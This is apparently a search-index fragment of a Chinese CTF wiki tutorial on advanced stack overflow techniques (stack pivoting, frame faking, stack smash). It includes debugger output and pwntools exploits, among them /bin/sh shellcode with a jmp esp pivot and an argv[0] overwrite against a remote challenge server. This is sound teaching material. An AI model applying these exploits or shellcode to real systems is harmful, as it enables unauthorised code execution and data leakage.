\n__IO_gets\n\n\n\n\n\n\u6211\u4eec\u53ef\u4ee5\u786e\u5b9a\u6211\u4eec\u8bfb\u5165\u7684\u5b57\u7b26\u4e32\u7684\u8d77\u59cb\u5730\u5740\u5176\u5b9e\u5c31\u662f\u8c03\u7528__IO_gets\u4e4b\u524d\u7684rsp\uff0c\u6240\u4ee5\u6211\u4eec\u628a\u65ad\u70b9\u4e0b\u5728call\u5904\uff0c\u5982\u4e0b\n\n\ngef\n\u27a4\n  \nb\n \n*\n0x000000000040080E\n\n\nBreakpoint\n \n2\n \nat\n \n0x40080e\n\n\ngef\n\u27a4\n  \nc\n\n\nContinuing.\n\n\nHello\n!\n\n\nWhat\ns\n \nyour\n \nname\n?\n \n\nBreakpoint\n \n2\n,\n \n0x000000000040080e\n \nin\n \n??\n \n()\n\n\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[\n \ncode:i386:\nx86-64\n \n]\n\u2500\u2500\u2500\u2500\n\n     \n0\nx400804\n                  \nxor\n    \neax\n,\n \neax\n\n     \n0\nx400806\n                  \ncall\n   \n0x4006b0\n \n__printf_chk@plt\n\n     \n0\nx40080b\n                  \nmov\n    \nrdi\n,\n \nrsp\n\n \n\u2192\n   \n0\nx40080e\n                  \ncall\n   \n0x4006c0\n \n_IO_gets@plt\n\n   \n\u21b3\n    \n0\nx4006c0\n \n_IO_gets@plt\n+\n0\n \njmp\n    \nQWORD\n \nPTR\n \n[\nrip\n+\n0x20062a\n]\n        \n# 0x600cf0 \n_IO_gets@got.plt\n\n        \n0x4006c6\n \n_IO_gets@plt\n+\n6\n \npush\n   \n0x9\n\n        \n0\nx4006cb\n \n_IO_gets@plt\n+\n11\n \njmp\n    \n0x400620\n\n        \n0\nx4006d0\n                  \nsub\n    \nrsp\n,\n \n0x8\n\n\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[\n \nstack\n \n]\n\u2500\u2500\u2500\u2500\n\n\n[\n0\nx7fffffffda40\n,\n \nl8\n]\n\n\n8\n\n\n0\nx00007fffffffda40\n\u2502+\n0x00\n:\n \n0x0000ff0000000000\n     \n\u2190\n \n$rsp\n,\n \n$rdi\n\n\n0\nx00007fffffffda48\n\u2502+\n0x08\n:\n \n0x0000000000000000\n\n\n0\nx00007fffffffda50\n\u2502+\n0x10\n:\n \n0x0000000000000000\n\n\n0\nx00007fffffffda58\n\u2502+\n0x18\n:\n \n0x0000000000000000\n\n\n0\nx00007fffffffda60\n\u2502+\n0x20\n:\n \n0x0000000000000000\n\n\n0\nx00007fffffffda68\n\u2502+\n0x28\n:\n \n0x0000000000000000\n\n\n0\nx00007fffffffda70\n\u2502+\n0x30\n:\n \n0x0000000000000000\n\n\n0\nx00007fffffffda78\n\u2502+\n0x38\n:\n \n0x0000000000000000\n\n\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[\n \ntrace\n \n]\n\u2500\u2500\u2500\u2500\n\n\n[\n#0] 0x40080e \u2192 call 0x4006c0 \n_IO_gets@plt\n\n\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n\n\ngef\n\u27a4\n  \nprint\n \n$rsp\n\n\n$1\n \n=\n \n(\nvoid\n \n*)\n \n0x7fffffffda40\n\n\n\n\n\n\u53ef\u4ee5\u770b\u51farsp\u7684\u503c\u4e3a0x7fffffffda40\uff0c\u90a3\u4e48\u76f8\u5bf9\u504f\u79fb\u4e3a\n\n\n \n0x00007fffffffdc58\n-\n0x7fffffffda40\n\n\n536\n\n\n \nhex\n(\n536\n)\n\n\n0x218\n\n\n\n\n\n\u5229\u7528\u7a0b\u5e8f\n\n\n\u6211\u4eec\u6784\u9020\u5229\u7528\u7a0b\u5e8f\u5982\u4e0b\n\n\nfrom\n \npwn\n \nimport\n \n*\n\n\ncontext\n.\nlog_level\n \n=\n \ndebug\n\n\nsmash\n \n=\n \nELF\n(\n./smashes\n)\n\n\nif\n \nargs\n[\nREMOTE\n]:\n\n    \nsh\n \n=\n \nremote\n(\npwn.jarvisoj.com\n,\n \n9877\n)\n\n\nelse\n:\n\n    \nsh\n \n=\n \nprocess\n(\n./smashes\n)\n\n\nargv_addr\n \n=\n \n0x00007fffffffdc58\n\n\nname_addr\n \n=\n \n0x7fffffffda40\n\n\nflag_addr\n \n=\n \n0x600D20\n\n\nanother_flag_addr\n \n=\n \n0x400d20\n\n\npayload\n \n=\n \na\n \n*\n \n(\nargv_addr\n \n-\n \nname_addr\n)\n \n+\n \np64\n(\nanother_flag_addr\n)\n\n\nsh\n.\nrecvuntil\n(\nname? \n)\n\n\nsh\n.\nsendline\n(\npayload\n)\n\n\nsh\n.\nrecvuntil\n(\nflag: \n)\n\n\nsh\n.\nsendline\n(\nbb\n)\n\n\ndata\n \n=\n \nsh\n.\nrecv\n()\n\n\nsh\n.\ninteractive\n()\n\n\n\n\n\n\u8fd9\u91cc\u6211\u4eec\u76f4\u63a5\u5c31\u5f97\u5230\u4e86flag\uff0c\u6ca1\u6709\u51fa\u73b0\u7f51\u4e0a\u8bf4\u7684\u5f97\u4e0d\u5230flag\u7684\u60c5\u51b5\u3002\n\n\n\u9898\u76ee", 
            "title": "\u82b1\u5f0f\u6808\u6ea2\u51fa\u6280\u5de7"
        }, 
        {
            "location": "/pwn/stackoverflow/others/#_1", 
            "text": "", 
            "title": "\u82b1\u5f0f\u6808\u6ea2\u51fa\u6280\u5de7"
        }, 
        {
            "location": "/pwn/stackoverflow/others/#stack-privot", 
            "text": "", 
            "title": "stack privot"
        }, 
        {
            "location": "/pwn/stackoverflow/others/#_2", 
            "text": "stack privot\uff0c\u6b63\u5982\u5b83\u6240\u63cf\u8ff0\u7684\uff0c\u8be5\u6280\u5de7\u5c31\u662f\u52ab\u6301\u6808\u6307\u9488\u6307\u5411\u653b\u51fb\u8005\u6240\u80fd\u63a7\u5236\u7684\u5185\u5b58\u5904\uff0c\u7136\u540e\u518d\u5728\u76f8\u5e94\u7684\u4f4d\u7f6e\u8fdb\u884cROP\u3002\u4e00\u822c\u6765\u8bf4\uff0c\u6211\u4eec\u53ef\u80fd\u5728\u4ee5\u4e0b\u60c5\u51b5\u9700\u8981\u4f7f\u7528stack privot   \u53ef\u4ee5\u63a7\u5236\u7684\u6808\u6ea2\u51fa\u7684\u5b57\u8282\u6570\u8f83\u5c11\uff0c\u96be\u4ee5\u6784\u9020\u8f83\u957f\u7684ROP\u94fe  \u5f00\u542f\u4e86PIE\u4fdd\u62a4\uff0c\u6808\u5730\u5740\u672a\u77e5\uff0c\u6211\u4eec\u53ef\u4ee5\u5c06\u6808\u52ab\u6301\u5230\u5df2\u77e5\u7684\u533a\u57df\u3002  \u5176\u5b83\u6f0f\u6d1e\u96be\u4ee5\u5229\u7528\uff0c\u6211\u4eec\u9700\u8981\u8fdb\u884c\u8f6c\u6362\uff0c\u6bd4\u5982\u8bf4\u5c06\u6808\u52ab\u6301\u5230\u5806\u7a7a\u95f4\uff0c\u4ece\u800c\u5229\u7528\u5806\u6f0f\u6d1e   \u6b64\u5916\uff0c\u5229\u7528stack privot\u6709\u4ee5\u4e0b\u51e0\u4e2a\u8981\u6c42    \u53ef\u4ee5\u63a7\u5236\u7a0b\u5e8f\u6267\u884c\u6d41\u3002    \u53ef\u4ee5\u63a7\u5236sp\u6307\u9488\u3002\u4e00\u822c\u6765\u8bf4\uff0c\u63a7\u5236\u6808\u6307\u9488\u4f1a\u4f7f\u7528ROP\uff0c\u5e38\u89c1\u7684\u63a7\u5236\u6808\u6307\u9488\u7684gadgets\u4e00\u822c\u662f    pop   rsp / esp   \u5f53\u7136\uff0c\u8fd8\u4f1a\u6709\u4e00\u4e9b\u5176\u5b83\u7684\u59ff\u52bf\u3002\u6bd4\u5982\u8bf4libc_csu_init\u4e2d\u7684gadgets\uff0c\u6211\u4eec\u901a\u8fc7\u504f\u79fb\u5c31\u53ef\u4ee5\u5f97\u5230\u63a7\u5236rsp\u6307\u9488\u3002\u4e0a\u9762\u7684\u662f\u6b63\u5e38\u7684\uff0c\u4e0b\u9762\u7684\u662f\u504f\u79fb\u7684\u3002  gef \u27a4    x / 7 i   0x000000000040061a  0 x40061a   __libc_csu_init + 90 :    pop      rbx  0 x40061b   __libc_csu_init + 91 :    pop      rbp  0 x40061c   __libc_csu_init + 92 :    pop      r12  0 x40061e   __libc_csu_init + 94 :    pop      r13  0 x400620   __libc_csu_init + 96 :    pop      r14  0 x400622   __libc_csu_init + 98 :    pop      r15  0 x400624   __libc_csu_init + 100 :   ret      gef \u27a4    x / 7 i   0x000000000040061d  0 x40061d   __libc_csu_init + 93 :    pop      rsp  0 x40061e   __libc_csu_init + 94 :    pop      r13  0 x400620   __libc_csu_init + 96 :    pop      r14  0 x400622   __libc_csu_init + 98 :    pop      r15  0 x400624   __libc_csu_init + 100 :   ret   \u6b64\u5916\uff0c\u8fd8\u6709\u66f4\u52a0\u9ad8\u7ea7\u7684fake frame\u3002   \u5b58\u5728\u53ef\u4ee5\u63a7\u5236\u5185\u5bb9\u7684\u5185\u5b58\uff0c\u4e00\u822c\u6709\u5982\u4e0b  bss\u6bb5\u3002\u7531\u4e8e\u8fdb\u7a0b\u6309\u9875\u5206\u914d\u5185\u5b58\uff0c\u5206\u914d\u7ed9bss\u6bb5\u7684\u5185\u5b58\u5927\u5c0f\u81f3\u5c11\u4e00\u4e2a\u9875(4k,0x1000)\u5927\u5c0f\u3002\u7136\u800c\u4e00\u822cbss\u6bb5\u7684\u5185\u5bb9\u7528\u4e0d\u4e86\u8fd9\u4e48\u591a\u7684\u7a7a\u95f4\uff0c\u5e76\u4e14bss\u6bb5\u5206\u914d\u7684\u5185\u5b58\u9875\u62e5\u6709\u8bfb\u5199\u6743\u9650\u3002  heap\u3002\u4f46\u662f\u8fd9\u4e2a\u9700\u8981\u6211\u4eec\u80fd\u591f\u6cc4\u9732\u5806\u5730\u5740\u3002", 
            "title": "\u539f\u7406"
        }, 
        {
            "location": "/pwn/stackoverflow/others/#_3", 
            "text": "", 
            "title": "\u793a\u4f8b"
        }, 
        {
            "location": "/pwn/stackoverflow/others/#1", 
            "text": "\u8fd9\u91cc\u6211\u4eec\u4ee5 X-CTF Quals 2016 - b0verfl0w \u4e3a\u4f8b\uff0c\u8fdb\u884c\u4ecb\u7ecd\u3002\u9996\u5148\uff0c\u67e5\u770b\u7a0b\u5e8f\u7684\u5b89\u5168\u4fdd\u62a4\uff0c\u5982\u4e0b  \u279c  X-CTF Quals  2016  - b0verfl0w git: ( iromise )  \u2717 checksec b0verfl0w                 \n    Arch:     i386-32-little\n    RELRO:    Partial RELRO\n    Stack:    No canary found\n    NX:       NX disabled\n    PIE:      No PIE  ( 0x8048000 ) \n    RWX:      Has RWX segments  \u53ef\u4ee5\u770b\u51fa\u6e90\u7a0b\u5e8f\u4e3a32\u4f4d\uff0c\u4e5f\u6ca1\u6709\u5f00\u542fNX\u4fdd\u62a4\uff0c\u4e0b\u9762\u6211\u4eec\u6765\u627e\u4e00\u4e0b\u7a0b\u5e8f\u7684\u6f0f\u6d1e  signed   int   vul ()  { \n   char   s ;   // [sp+18h] [bp-20h]@1 \n\n   puts ( \\n ====================== ); \n   puts ( \\n Welcome to X-CTF 2016! ); \n   puts ( \\n ====================== ); \n   puts ( What s your name? ); \n   fflush ( stdout ); \n   fgets ( s ,   50 ,   stdin ); \n   printf ( Hello %s. ,   s ); \n   fflush ( stdout ); \n   return   1 ;  }   \u53ef\u4ee5\u770b\u51fa\uff0c\u6e90\u7a0b\u5e8f\u5b58\u5728\u6808\u6ea2\u51fa\u6f0f\u6d1e\u3002\u4f46\u662f\u5176\u6240\u80fd\u6ea2\u51fa\u7684\u5b57\u8282\u5c31\u53ea\u670950-0x20-4=14\u4e2a\u5b57\u8282\uff0c\u6240\u4ee5\u6211\u4eec\u5f88\u96be\u6267\u884c\u4e00\u4e9b\u6bd4\u8f83\u597d\u7684ROP\u3002\u8fd9\u91cc\u6211\u4eec\u5c31\u8003\u8651stack privot\u3002\u7531\u4e8e\u7a0b\u5e8f\u672c\u8eab\u5e76\u6ca1\u6709\u5f00\u542f\u5806\u6808\u4fdd\u62a4\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u5728\u6808\u4e0a\u5e03\u7f6eshellcode\u5e76\u6267\u884c\u3002\u57fa\u672c\u5229\u7528\u601d\u8def\u5982\u4e0b   \u5229\u7528\u6808\u6ea2\u51fa\u5e03\u7f6eshellcode  \u63a7\u5236eip\u6307\u5411shellcode\u5904   \u7b2c\u4e00\u6b65\uff0c\u8fd8\u662f\u6bd4\u8f83\u5bb9\u6613\u5730\uff0c\u76f4\u63a5\u8bfb\u53d6\u5373\u53ef\uff0c\u4f46\u662f\u7531\u4e8e\u7a0b\u5e8f\u672c\u8eab\u4f1a\u5f00\u542fASLR\u4fdd\u62a4\uff0c\u6240\u4ee5\u6211\u4eec\u5f88\u96be\u76f4\u63a5\u77e5\u9053shellcode\u7684\u5730\u5740\u3002\u4f46\u662f\u6808\u4e0a\u76f8\u5bf9\u504f\u79fb\u662f\u56fa\u5b9a\u7684\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u5229\u7528\u6808\u6ea2\u51fa\u5bf9esp\u8fdb\u884c\u64cd\u4f5c\uff0c\u4f7f\u5176\u6307\u5411shellcode\u5904\uff0c\u5e76\u4e14\u76f4\u63a5\u63a7\u5236\u7a0b\u5e8f\u8df3\u8f6c\u81f3esp\u5904\u3002\u90a3\u4e0b\u9762\u5c31\u662f\u627e\u63a7\u5236\u7a0b\u5e8f\u8df3\u8f6c\u5230esp\u5904\u7684gadgets\u4e86\u3002  \u279c  X-CTF Quals  2016  - b0verfl0w git: ( iromise )  \u2717 ROPgadget --binary b0verfl0w --only  jmp|ret          \nGadgets  information  ============================================================ \n0x08048504 : jmp esp\n0x0804836a : ret\n0x0804847e : ret 0xeac1\n\nUnique gadgets found:  3   \u8fd9\u91cc\u6211\u4eec\u53d1\u73b0\u6709\u4e00\u4e2a\u53ef\u4ee5\u76f4\u63a5\u8df3\u8f6c\u5230esp\u7684gadgets\u3002\u90a3\u4e48\u6211\u4eec\u53ef\u4ee5\u5e03\u7f6epayload\u5982\u4e0b  shellcode|padding|fake ebp|0x08048504|set esp point to shellcode and jmp esp  \u90a3\u4e48\u6211\u4eecpayload\u4e2d\u7684\u6700\u540e\u4e00\u90e8\u5206\u6539\u5982\u4f55\u8bbe\u7f6eesp\u5462\uff0c\u53ef\u4ee5\u77e5\u9053   size(shellcode+padding)=0x20  size(fake ebp)=0x4  size(0x08048504)=0x4   \u6240\u4ee5\u6211\u4eec\u6700\u540e\u4e00\u6bb5\u9700\u8981\u6267\u884c\u7684\u6307\u4ee4\u5c31\u662f  sub   0x28 , esp  jmp   esp   \u6240\u4ee5\u6700\u540e\u7684exp\u5982\u4e0b  from   pwn   import   *  sh   =   process ( ./b0verfl0w )  shellcode_x86   =   \\x31\\xc9\\xf7\\xe1\\x51\\x68\\x2f\\x2f\\x73  shellcode_x86   +=   \\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\xb0  shellcode_x86   +=   \\x0b\\xcd\\x80  sub_esp_jmp   =   asm ( sub esp, 0x28;jmp esp )  jmp_esp   =   0x08048504  payload   =   shellcode_x86   +   ( \n     0x20   -   len ( shellcode_x86 ))   *   b   +   bbbb   +   p32 ( jmp_esp )   +   sub_esp_jmp  sh . sendline ( payload )  sh . interactive ()", 
            "title": "\u4f8b1"
        }, 
        {
            "location": "/pwn/stackoverflow/others/#2-", 
            "text": "\u5f85\u3002", 
            "title": "\u4f8b2-\u8f6c\u79fb\u5806"
        }, 
        {
            "location": "/pwn/stackoverflow/others/#_4", 
            "text": "EkoPartyCTF 2016 fuckzing-exploit-200", 
            "title": "\u9898\u76ee"
        }, 
        {
            "location": "/pwn/stackoverflow/others/#frame-faking", 
            "text": "\u6b63\u5982\u8fd9\u4e2a\u6280\u5de7\u540d\u5b57\u6240\u8bf4\u7684\u90a3\u6837\uff0c\u8fd9\u4e2a\u6280\u5de7\u5c31\u662f\u6784\u9020\u4e00\u4e2a\u865a\u5047\u7684\u6808\u5e27\u6765\u63a7\u5236\u7a0b\u5e8f\u7684\u6267\u884c\u6d41\u3002", 
            "title": "frame faking"
        }, 
        {
            "location": "/pwn/stackoverflow/others/#_5", 
            "text": "\u6982\u62ec\u5730\u8bb2\uff0c\u6211\u4eec\u5728\u4e4b\u524d\u8bb2\u7684\u6808\u6ea2\u51fa\u4e0d\u5916\u4e4e\u4e24\u79cd\u65b9\u5f0f   \u63a7\u5236\u7a0b\u5e8fEIP  \u63a7\u5236\u7a0b\u5e8fEBP   \u5176\u6700\u7ec8\u90fd\u662f\u63a7\u5236\u7a0b\u5e8f\u7684\u6267\u884c\u6d41\u3002\u5728frame faking\u4e2d\uff0c\u6211\u4eec\u6240\u5229\u7528\u7684\u6280\u5de7\u4fbf\u662f\u540c\u65f6\u63a7\u5236EBP\u4e0eEIP\uff0c\u8fd9\u6837\u6211\u4eec\u5728\u63a7\u5236\u7a0b\u5e8f\u6267\u884c\u6d41\u7684\u540c\u65f6\uff0c\u4e5f\u6539\u53d8\u7a0b\u5e8f\u6808\u5e27\u7684\u4f4d\u7f6e\u3002\u4e00\u822c\u6765\u8bf4\u5176payload\u5982\u4e0b  buffer padding|fake ebp|leave ret addr|  \u5373\u6211\u4eec\u5229\u7528\u6808\u6ea2\u51fa\u5c06\u6808\u4e0a\u6784\u9020\u4e3a\u5982\u4e0a\u683c\u5f0f\u3002\u8fd9\u91cc\u6211\u4eec\u4e3b\u8981\u63a5\u4e0b\u540e\u9762\u4e24\u4e2a\u90e8\u5206   \u51fd\u6570\u7684\u8fd4\u56de\u5730\u5740\u88ab\u6211\u4eec\u8986\u76d6\u4e3a\u6267\u884cleave ret\u7684\u5730\u5740\uff0c\u8fd9\u5c31\u8868\u660e\u4e86\u51fd\u6570\u5728\u6b63\u5e38\u6267\u884c\u5b8c\u81ea\u5df1\u7684leave ret\u540e\uff0c\u8fd8\u4f1a\u518d\u6b21\u6267\u884c\u4e00\u6b21leave ret\u3002  \u5176\u4e2dfake ebp\u4e3a\u6211\u4eec\u6784\u9020\u7684\u6808\u5e27\u7684\u57fa\u5730\u5740\uff0c\u9700\u8981\u6ce8\u610f\u7684\u662f\u8fd9\u91cc\u662f\u4e00\u4e2a\u5730\u5740\u3002\u4e00\u822c\u6765\u8bf4\u6211\u4eec\u6784\u9020\u7684\u5047\u7684\u6808\u5e27\u5982\u4e0b   fake ebp\n|\nv\nebp2|target function addr|leave ret addr|arg1|arg2  \u8fd9\u91cc\u6211\u4eec\u7684fake ebp\u6307\u5411ebp2\uff0c\u5373\u5b83\u4e3aebp2\u6240\u5728\u7684\u5730\u5740\u3002\u901a\u5e38\u6765\u8bf4\uff0c\u8fd9\u91cc\u90fd\u662f\u6211\u4eec\u80fd\u591f\u63a7\u5236\u7684\u53ef\u8bfb\u7684\u5185\u5bb9\u3002  \u4e0b\u9762\u7684\u6c47\u7f16\u8bed\u6cd5\u662f AT T \u8bed\u6cd5\u3002  \u5728\u6211\u4eec\u4ecb\u7ecd\u57fa\u672c\u7684\u63a7\u5236\u8fc7\u7a0b\u4e4b\u524d\uff0c\u6211\u4eec\u8fd8\u662f\u6709\u5fc5\u8981\u8bf4\u4e00\u4e0b\uff0c\u51fd\u6570\u7684\u5165\u53e3\u70b9\u4e0e\u51fa\u53e3\u70b9\u7684\u57fa\u672c\u64cd\u4f5c  \u5165\u53e3\u70b9  push ebp  # \u5c06ebp\u538b\u6808\nmove esp, ebp #\u5c06esp\u7684\u503c\u8d4b\u7ed9ebp  \u51fa\u53e3\u70b9  leave\nret #pop eip\uff0c\u5f39\u51fa\u6808\u9876\u5143\u7d20\u4f5c\u4e3a\u7a0b\u5e8f\u4e0b\u4e00\u4e2a\u6267\u884c\u5730\u5740  \u5176\u4e2dleave\u6307\u4ee4\u76f8\u5f53\u4e8e  move ebp, esp # \u5c06ebp\u7684\u503c\u8d4b\u7ed9esp\npop ebp #\u5f39\u51faebp  \u4e0b\u9762\u6211\u4eec\u6765\u4ed4\u7ec6\u8bf4\u4e00\u4e0b\u57fa\u672c\u7684\u63a7\u5236\u8fc7\u7a0b\u3002    \u5728\u6709\u6808\u6ea2\u51fa\u7684\u7a0b\u5e8f\u6267\u884cleave\u65f6\uff0c\u5176\u5206\u4e3a\u4e24\u4e2a\u6b65\u9aa4    move ebp, esp \uff0c\u8fd9\u4f1a\u5c06esp\u4e5f\u6307\u5411\u5f53\u524d\u6808\u6ea2\u51fa\u6f0f\u6d1e\u7684ebp\u57fa\u5730\u5740\u5904\u3002    pop ebp\uff0c \u8fd9\u4f1a\u5c06\u6808\u4e2d\u5b58\u653e\u7684fake ebp\u7684\u503c\u8d4b\u7ed9ebp\u3002\u5373\u6267\u884c\u5b8c\u6307\u4ee4\u4e4b\u540e\uff0cebp\u4fbf\u6307\u5411\u4e86ebp2\uff0c\u4e5f\u5c31\u662f\u4fdd\u5b58\u4e86ebp2\u6240\u5728\u7684\u5730\u5740\u3002    \u6267\u884cret\u6307\u4ee4\uff0c\u4f1a\u518d\u6b21\u6267\u884cleave ret\u6307\u4ee4\u3002    \u6267\u884cleave\u6307\u4ee4\uff0c\u5176\u5206\u4e3a\u4e24\u4e2a\u6b65\u9aa4    move ebp, esp \uff0c\u8fd9\u4f1a\u5c06esp\u6307\u5411ebp2\u3002    pop ebp\uff0c\u6b64\u65f6\uff0c\u4f1a\u5c06ebp\u7684\u5185\u5bb9\u8bbe\u7f6e\u4e3aebp2\u7684\u503c\uff0c\u540c\u65f6esp\u4f1a\u6307\u5411target function\u3002    \u6267\u884cret\u6307\u4ee4\uff0c\u8fd9\u65f6\u5019\u7a0b\u5e8f\u5c31\u4f1a\u6267\u884ctargetfunction\uff0c\u5f53\u5176\u8fdb\u884c\u7a0b\u5e8f\u7684\u65f6\u5019\u4f1a\u6267\u884c    push ebp,\u4f1a\u5c06ebp2\u503c\u538b\u5165\u6808\u4e2d\uff0c    move esp, ebp\uff0c\u5c06ebp\u6307\u5411\u5f53\u524d\u57fa\u5730\u5740\u3002    \u6b64\u65f6\u7684\u6808\u7ed3\u6784\u5982\u4e0b  ebp\n|\nv\nebp2|leave ret addr|arg1|arg2    \u5f53\u7a0b\u5e8f\u6267\u884c\u5e08\uff0c\u5176\u4f1a\u6b63\u5e38\u7533\u8bf7\u7a7a\u95f4\uff0c\u540c\u65f6\u6211\u4eec\u5728\u6808\u4e0a\u4e5f\u5b89\u6392\u4e86\u8be5\u51fd\u6570\u5bf9\u5e94\u7684\u53c2\u6570\uff0c\u6240\u4ee5\u7a0b\u5e8f\u4f1a\u6b63\u5e38\u6267\u884c\u3002    \u7a0b\u5e8f\u7ed3\u675f\u540e\uff0c\u5176\u53c8\u4f1a\u6267\u884c\u4e24\u6b21 leave ret addr\uff0c\u6240\u4ee5\u5982\u679c\u6211\u4eec\u5728ebp2\u5904\u5e03\u7f6e\u597d\u4e86\u5bf9\u5e94\u7684\u5185\u5bb9\uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u53ef\u4ee5\u4e00\u76f4\u63a7\u5236\u7a0b\u5e8f\u7684\u6267\u884c\u6d41\u7a0b\u3002    \u53ef\u4ee5\u770b\u51fa\u5728fake frame\u4e2d\uff0c\u6211\u4eec\u6709\u4e00\u4e2a\u9700\u6c42\u5c31\u662f\uff0c\u6211\u4eec\u5fc5\u987b\u5f97\u6709\u4e00\u5757\u53ef\u4ee5\u5199\u7684\u5185\u5b58\uff0c\u5e76\u4e14\u6211\u4eec\u8fd8\u77e5\u9053\u8fd9\u5757\u5185\u5b58\u7684\u5730\u5740\uff0c\u8fd9\u4e00\u70b9\u4e0estack privot\u76f8\u4f3c\u3002", 
            "title": "\u539f\u7406"
        }, 
        {
            "location": "/pwn/stackoverflow/others/#_6", 
            "text": "\u76ee\u524d\u6765\u8bf4\uff0c\u6211\u5728exploit-exercise\u7684fusion level2\u4e2d\u5229\u7528\u8fc7\u8fd9\u4e2a\u6280\u5de7\uff0c\u5176\u5b83\u5730\u65b9\u6682\u65f6\u8fd8\u672a\u9047\u5230\uff0c\u9047\u5230\u7684\u65f6\u5019\u518d\u8fdb\u884c\u8865\u5145\u3002", 
            "title": "\u4f8b\u5b50"
        }, 
        {
            "location": "/pwn/stackoverflow/others/#_7", 
            "text": "\u53c2\u8003\u9605\u8bfb   http://www.xfocus.net/articles/200602/851.html  http://phrack.org/issues/58/4.html", 
            "title": "\u9898\u76ee"
        }, 
        {
            "location": "/pwn/stackoverflow/others/#stack-smash", 
            "text": "", 
            "title": "Stack smash"
        }, 
        {
            "location": "/pwn/stackoverflow/others/#_8", 
            "text": "\u5728\u7a0b\u5e8f\u52a0\u4e86canary\u4fdd\u62a4\u4e4b\u540e\uff0c\u5982\u679c\u6211\u4eec\u8bfb\u53d6\u7684buffer\u8986\u76d6\u4e86\u5bf9\u5e94\u7684\u503c\u65f6\uff0c\u7a0b\u5e8f\u5c31\u4f1a\u62a5\u9519\uff0c\u800c\u4e00\u822c\u6765\u8bf4\u6211\u4eec\u5e76\u4e0d\u4f1a\u5173\u5fc3\u62a5\u9519\u4fe1\u606f\u3002\u800cstack smash\u6280\u5de7\u5219\u5c31\u662f\u5229\u7528\u6253\u5370\u8fd9\u4e00\u4fe1\u606f\u7684\u7a0b\u5e8f\u6765\u5f97\u5230\u6211\u4eec\u60f3\u8981\u7684\u5185\u5bb9\u3002\u8fd9\u662f\u56e0\u4e3a\u5728\u7a0b\u5e8f\u53d1\u73b0canary\u4fdd\u62a4\u4e4b\u540e\uff0c\u5982\u679c\u53d1\u73b0canary\u88ab\u4fee\u6539\u7684\u8bdd\uff0c\u7a0b\u5e8f\u5c31\u4f1a\u6267\u884c__stack_chk_fail\u51fd\u6570\u6765\u6253\u5370argv[0]\u6307\u9488\u6240\u6307\u5411\u7684\u5b57\u7b26\u4e32\uff0c\u6b63\u5e38\u60c5\u51b5\u4e0b\uff0c\u8fd9\u4e2a\u6307\u9488\u6307\u5411\u4e86\u7a0b\u5e8f\u540d\u3002\u5176\u4ee3\u7801\u5982\u4e0b  void   __attribute__   (( noreturn ))   __stack_chk_fail   ( void )  { \n   __fortify_fail   ( stack smashing detected );  }  void   __attribute__   (( noreturn ))   internal_function   __fortify_fail   ( const   char   * msg )  { \n   /* The loop is added only to keep gcc happy.  */ \n   while   ( 1 ) \n     __libc_message   ( 2 ,   *** %s ***: %s terminated \\n , \n                     msg ,   __libc_argv [ 0 ]   ?:   unknown );  }   \u6240\u4ee5\u8bf4\u5982\u679c\u6211\u4eec\u5229\u7528\u6808\u6ea2\u51fa\u8986\u76d6argv[0]\u4e3a\u6211\u4eec\u60f3\u8981\u8f93\u51fa\u7684\u5b57\u7b26\u4e32\u7684\u5730\u5740\uff0c\u90a3\u4e48\u5728__fortify_fail\u51fd\u6570\u4e2d\u5c31\u4f1a\u8f93\u51fa\u6211\u4eec\u60f3\u8981\u7684\u4fe1\u606f\u3002", 
            "title": "\u539f\u7406"
        }, 
        {
            "location": "/pwn/stackoverflow/others/#_9", 
            "text": "\u8fd9\u91cc\uff0c\u6211\u4eec\u4ee52015\u5e7432C3 CTF smashes\u4e3a\u4f8b\u8fdb\u884c\u4ecb\u7ecd\uff0c\u8be5\u9898\u76ee\u5728jarvisoj\u4e0a\u6709\u590d\u73b0\u3002", 
            "title": "\u4f8b\u5b50"
        }, 
        {
            "location": "/pwn/stackoverflow/others/#_10", 
